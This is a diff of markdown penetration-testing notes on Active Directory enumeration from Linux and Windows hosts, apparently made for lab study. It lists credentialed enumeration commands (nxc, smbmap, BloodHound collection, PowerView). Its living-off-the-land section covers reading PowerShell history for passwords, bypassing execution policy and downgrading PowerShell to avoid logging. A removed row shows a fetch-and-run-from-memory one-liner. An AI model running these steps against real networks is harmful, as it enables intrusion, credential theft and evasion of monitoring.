@@ -1,22 +1,24 @@
 ### Content
 
-1. [From Linux Host](#from-linux-host)
-	- [Crackmapexec or NetExec](#crackmapexec-or-netexec)
+- [From Linux](#from-linux)
+	- [NXC](#nxc)
 	- [SMBMap](#smbmap)
 	- [rpcclient](#rpcclient)
-	- [Impacket Toolkit](#impacket-toolkit)
+	- [Impacket](#impacket)
 	- [Windapsearch](#windapsearch)
-	- BloodHound
-2. [From Windows Host](#from-windows-host)
+	- [BloodHound](#bloodhound)
+- [From Windows](#from-windows)
 	- [ActiveDirectory Module](#activedirectory-module)
+	- [Nltest](#nltest)
 	- [PowerView](#powerview)
 	- [Snaffler](#snaffler)
-3. [Living Off the Land](#living-off-the-land)
-	- [Basic Enumeration](#basic-enumeration)
-	- [Network Enumeration](#network-enumeration)
-	- [WMI](#wmi)
-	- [NET](#net)
-	- [Dsquery](#dsquery)
+	- [Living Off the Land](#living-off-the-land)
+		- [Basic Enumeration](#basic-enumeration)
+		- [Network Enumeration](#network-enumeration)
+		- [WMI](#wmi)
+		- [NET](#net)
+		- [Dsquery](#dsquery)
+			- [userAccountControl Values](#useraccountcontrol-values)
 
 > [!Note]
 > Enumerate the domain DCs:
@@ -34,25 +36,28 @@
 > `nslookup`
 > `Set type=all`
 > `_ldap._tcp.dc._msdcs.DOMAIN.COM`
-
+> 
+> - Using CMD - `nltest`
+>   
+>   `nltest /dclist:domain_name` -> finds all domain controllers in a specific domain.
 
 ---
-# From Linux Host
+## From Linux
 
-#### Crackmapexec or NetExec
+#### NXC
 
 ``` bash
 # Domain User Enumeration (retrieve a list of all domain users).
-$ sudo crackmapexec smb 172.16.5.5 -u username -p password --users
+$ nxc smb 172.16.5.5 -u username -p password --users
 # List of domain groups.
-$ sudo crackmapexec smb 172.16.5.5 -u username -p password --groups
+$ nxc smb 172.16.5.5 -u username -p password --groups
 # List logged on users
-$ sudo crackmapexec smb 172.16.5.130 -u username -p password --loggedon-users
+$ nxc smb 172.16.5.130 -u username -p password --loggedon-users
 # Shares enumeartion
-$ sudo crackmapexec smb 172.16.5.5 -u username -p password --shares
-	# The module spider_plus will dig through each readable share on the host and list all readable files.
-	$ sudo crackmapexec smb 172.16.5.5 -u username -p password -M spider_plus --share 'Department Shares'
-	# When completed, CME writes the results to a JSON file located at /tmp/cme_spider_plus/<ip of host>.
+$ nxc smb 172.16.5.5 -u username -p password --shares
+# The module spider_plus will dig through each readable share on the host and list all readable files.
+$ nxc smb 172.16.5.5 -u username -p password -M spider_plus --share 'Department Shares'
+# When completed, CME writes the results to a JSON file located at /tmp/cme_spider_plus/<ip of host>.
 ```
 
 #### SMBMap
@@ -60,8 +65,8 @@ $ sudo crackmapexec smb 172.16.5.5 -u username -p password --shares
 ``` bash
 # Shares enumeartion
 $ smbmap -u username -p password -d DOMAIN.LOCAL -H 172.16.5.5
-	# Recursive List Of All Directories
-	$ smbmap -u username -p password -d DOMAIN.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
+# Recursive List Of All Directories
+$ smbmap -u username -p password -d DOMAIN.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
 ```
 
 #### rpcclient
@@ -78,7 +83,7 @@ user:[krbtgt] rid:[0x1f6]
 rpcclient $> queryuser 0x1f4
 ```
 
-#### Impacket Toolkit
+#### Impacket
 
 ``` bash
 # To connect to a host with psexec.py, we need credentials for a user with local administrator privileges.
@@ -99,8 +104,18 @@ $ python3 windapsearch.py --dc-ip 172.16.5.5 -u user@domain.local -p password --
 $ python3 windapsearch.py --dc-ip 172.16.5.5 -u user@domain.local -p password -PU
 ```
 
+#### BloodHound
+
+[BloodHound Cypher Cheatsheet](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/)
+
+```bash
+$ bloodhound-ce-python -c All -d 'DOMAIN.LOCAL' -u 'USER' -p 'PASS' -ns <DC-IP> --dns-tcp
+$ zip -r file.zip *.json
+# Upload data the zip file into BlooHound
+```
+
 ---
-# From Windows Host
+## From Windows
 #### ActiveDirectory Module
 
 [ActiveDirectory PowerShell module ](https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps)
@@ -108,10 +123,14 @@ $ python3 windapsearch.py --dc-ip 172.16.5.5 -u user@domain.local -p password -P
 ``` Powershell
 # Check whether the module is imported and import it if not
 PS C:\Users> get-module
-# If it's not there, install its sub feature
+# If it's not there, install its sub feature (Server machine)
 PS C:\Users> Install-WindowsFeature -Name "RSAT-AD-PowerShell" -IncludeAllSubFeature
+# windows 10/11
+Add-WindowsCapability -Online -Name "Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0"
+
 # Import it if it's not imported
 PS C:\Users> import-module ActiveDirectory
+
 # Get Domain Info
 PS C:\Users> Get-ADDomain
 # Search for a user by a specific Properity
@@ -135,7 +154,24 @@ PS C:\Users> Get-ADGroupMember -Identity "Group Name from above"
 PS C:\Users> Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
 ```
 
+#### Nltest
+
+```bash
+# finds all domain controllers in a specific domain.
+nltest /dclist:domain_name
+
+# finds the current DC for a user or computer.
+nltest /dsgetdc:domain_name
+
+# lists all domains trusted by the current domain.
+nltest /trusted_domains
+
+# queries DNS for DC records.
+nltest /dnsgetdc:domain_name
+```
+
 #### PowerView
+
 [PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
 
 ``` Powershell
@@ -173,58 +209,86 @@ PS C:\Users> Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
 ```
 
 ---
-# Living Off the Land
+### Living Off the Land
 
 The techniques here for testing AD environment from a managed `Windows` host with no internet access, and all efforts to load tools onto it have failed.
+
 #### Basic Enumeration
 
-| **Command**                                                                                                                | **Result**                                                                                                                                                                                                                                    |
-| -------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| `hostname`                                                                                                                 | Prints the PC's Name                                                                                                                                                                                                                          |
-| `[System.Environment]::OSVersion.Version`                                                                                  | Prints out the OS version and revision level                                                                                                                                                                                                  |
-| `wmic qfe get Caption,Description,HotFixID,InstalledOn`                                                                    | Prints the patches and hotfixes applied to the host                                                                                                                                                                                           |
-| `ipconfig /all`                                                                                                            | Prints out network adapter state and configurations                                                                                                                                                                                           |
-| `set`                                                                                                                      | Displays a list of environment variables for the current session (ran from CMD-prompt)                                                                                                                                                        |
-| `echo %USERDOMAIN%`                                                                                                        | Displays the domain name to which the host belongs (ran from CMD-prompt)                                                                                                                                                                      |
-| `echo %logonserver%`                                                                                                       | Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt)                                                                                                                                                    |
-| [systeminfo](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/systeminfo)                   | Print a summary of the host's information for us in one tidy output.                                                                                                                                                                          |
-| `Get-Module`                                                                                                               | Lists available modules loaded for use.                                                                                                                                                                                                       |
-| `Get-ExecutionPolicy -List`                                                                                                | Will print the [execution policy](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2) settings for each scope on a host.                                         |
-| `Set-ExecutionPolicy Bypass -Scope Process`                                                                                | This will change the policy for our current process using the `-Scope` parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host. |
-| `Get-ChildItem Env: \| ft Key,Value`                                                                                       | Return environment values such as key paths, users, computer information, etc.                                                                                                                                                                |
-| `Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt`                                 | With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.                       |
-| `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"` | This is a quick and easy way to download a file from the web using PowerShell and call it from memory.                                                                                                                                        |
-| `Get-host`                                                                                                                 | Print information about the current PowerShell session.                                                                                                                                                                                       |
-| `powershell.exe -version 2`                                                                                                | Change the PowerShell version to a version that has no logging feature if available.                                                                                                                                                          |
-| `netsh advfirewall show allprofiles`                                                                                       | [netsh](https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts) utility will help us to see the state of the Windows firewall settings and check the status of the Windows defender.                    |
-| `sc query windefend`                                                                                                       | Windows Defender Check (from CMD.exe)                                                                                                                                                                                                         |
-| `Get-MpComputerStatus`                                                                                                     | Check Windows defender status and configuration settings                                                                                                                                                                                      |
-| `qwinsta`                                                                                                                  | (Query WINdows STAtion) shows current sessions on the host.                                                                                                                                                                                   |
+```powershell
+# Prints the PC's Name
+PS C:\> hostname
+# Print information about the current PowerShell session.
+PS C:\> get-host
+# (Query WINdows STAtion) shows current sessions on the host.
+PS C:\> qwinsta
+# Change to a version that has no logging feature if available.
+PS C:\> powershell.exe -version 2
+# OS version and revision level
+PS C:\>[System.Environment]::OSVersion.Version
+# Patches and hotfixes applied
+PS C:\> wmic qfe get Caption,Description,HotFixID,InstalledOn
+# Display environment vars
+PS C:\> Get-ChildItem Env: | ft Key,Value
+# Display environment vars
+PS C:\> cmd /c set
+# Display the user domain
+PS C:\> cmd /c echo %USERDOMAIN%
+# The DC the host checks in with
+PS C:\> cmd /c echo %logonserver%
+# Print the system information summary
+PS C:\> systeminfo
+# List available modules
+PS C:\> get-module
+# Will print the execution policy settings for each scope on a host.
+PS C:\> Get-ExecutionPolicy -List
+# Change the current process policy.
+PS C:\> Set-ExecutionPolicy Bypass -Scope Process
+# Get the specified user's PowerShell history.
+PS C:\> Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
+# State of the Windows firewall and Windows defender.
+PS C:\> netsh advfirewall show allprofiles
+# Windows Defender Check
+PS C:\> cmd /c sc query windefend
+# Check Windows defender status and configuration settings
+PS C:\> Get-MpComputerStatus
+```
 
 #### Network Enumeration
 
-| **Networking Commands**              | **Description**                                                                                                  |
-| ------------------------------------ | ---------------------------------------------------------------------------------------------------------------- |
-| `arp -a`                             | Lists all known hosts stored in the arp table.                                                                   |
-| `ipconfig /all`                      | Prints out adapter settings for the host. We can figure out the network segment from here.                       |
-| `route print`                        | Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host. |
-| `netsh advfirewall show allprofiles` | Displays the status of the host's firewall. We can determine if it is active and filtering traffic.              |
+```PowerSHell
+# Display all network adapters
+PS C:\> ipconfig /all
+# Dipslay the arp table
+PS C:\> arp -a
+# Display the routing table (IPv4 & IPv6)
+PS C:\> route print
+# 
+PS C:\>
+```
 
 #### WMI
 
-[Windows Management Instrumentation (WMI)](https://docs.microsoft.com/en-us/windows/win32/wmisdk/about-wmi)
-This [cheatsheet](https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4) has some useful commands for querying host and domain info using wmic.
+[Windows Management Instrumentation (WMI)](https://docs.microsoft.com/en-us/windows/win32/wmisdk/about-wmi) - [cheatsheet](https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4)for querying host and domain info using wmic.
 
-| **Command**                                                                              | **Description**                                                                                                      |
-| ---------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------- |
-| `wmic qfe get Caption,Description,HotFixID,InstalledOn`                                  | Prints the patch level and description of the Hotfixes applied                                                       |
-| `wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List`     | Displays basic host information to include any attributes within the list                                            |
-| `wmic process list /format:list`                                                         | A listing of all processes on host                                                                                   |
-| `wmic ntdomain list /format:list`                                                        | Displays information about the Domain and Domain Controllers                                                         |
-| `wmic useraccount list /format:list`                                                     | Displays information about all local accounts and any domain accounts that have logged into the device               |
-| `wmic group list /format:list`                                                           | Information about all local groups                                                                                   |
-| `wmic sysaccount list /format:list`                                                      | Dumps information about any system accounts that are being used as service accounts.                                 |
-| `wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress` | Information about the domain and the child domain, and the external forest that our current domain has a trust with. |
+```Powershell
+# Patch level and description of the Hotfixes applied
+PS C:\> wmic qfe get Caption,Description,HotFixID,InstalledOn
+# Basic host information to include any attributes within the list
+PS C:\> wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List
+# Listing all processes on host
+PS C:\> wmic process list /format:list
+# Displays domain and DC info
+PS C:\> wmic ntdomain list /format:list
+# Info about local accounts and domain accounts that have logged into the device
+PS C:\> wmic useraccount list /format:list
+# Info about local groups
+PS C:\> wmic group list /format:list
+# Info about any system accounts that are being used as service accounts
+PS C:\> wmic sysaccount list /format:list
+# Info about the domain, its child and the external forest that our current domain has a trust with.
+PS C:\> wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress
+```
 
 #### NET
 
@@ -301,7 +365,7 @@ PS C:\> dsquery * -filter "(&(objectCategory=person)(objectClass=user)(adminCoun
 	- `=8192` represents the decimal bitmask we want to match in this search.
 
 
-#### userAccountControl Values
+##### userAccountControl Values
 
 | Property flag                  | Value in hexadecimal | Value in decimal |
 | ------------------------------ | -------------------- | ---------------- |
